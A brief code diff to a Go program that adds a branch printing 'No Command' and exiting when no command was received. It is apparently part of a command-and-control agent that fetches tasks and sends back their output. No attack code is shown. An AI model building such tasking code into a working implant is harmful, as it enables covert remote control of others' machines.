@@ -220,6 +220,9 @@ func main() {
 	if commandInfo != nil {
 		fmt.Printf("[*] Command ID: %d\n[*] Command Code: %d\n[*] Param1: %s\n[*] Param2: %s\n", commandInfo.commandId, commandInfo.commandCode, commandInfo.param1, commandInfo.param2)
 
+	} else {
+		fmt.Println("[+] No Command")
+		return
 	}
 
 	// -=-=-=-=-=- SEND COMMAND OUTPUT -=-=-=-=-=-
